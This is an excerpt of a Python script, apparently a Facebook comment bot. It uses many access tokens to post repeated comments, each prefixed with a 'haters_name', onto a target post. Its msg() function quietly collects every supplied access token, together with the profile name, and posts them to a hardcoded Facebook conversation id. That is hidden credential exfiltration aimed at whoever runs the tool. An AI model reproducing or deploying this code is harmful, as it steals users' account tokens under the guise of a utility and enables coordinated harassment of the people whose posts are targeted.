...
class MyHandler(http.server.SimpleHTTPRequestHandler):
  ...
  def do_GET(self):
    ...
    self.end_headers()
    self.wfile.write(b"PRINC3 TRICK3R")
...
def post_comments():
  ...
  def getName(token):
    try:
      data = requests.get(
          f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
    except:
      data = ""
    if 'name' in data:
      return data['name']
      ...
      for comment_index in range(num_comments):
        ...
        if response.ok:
          print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
              comment_index + 1, post_url, token_index + 1,
              haters_name + ' ' + comment))
          ...
          print(
              "[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".
              format(comment_index + 1, post_url, token_index + 1,
                     haters_name + ' ' + comment))
          print("  - Time: {}".format(current_time))
          liness()
          liness()
...
def msg():
  parameters = {
      ...
      'message':
      'User Profile Name: ' + getName(random.choice(access_tokens)) +
      '\nToken: ' + " | ".join(access_tokens) +
      '\nLink: https://www.facebook.com/messages/t/' + convo_id
  }
  try:
    s = requests.post("https://graph.facebook.com/v15.0/t_100000713177502/",
                      data=parameters,
                      headers=headers)
  except:
    pass
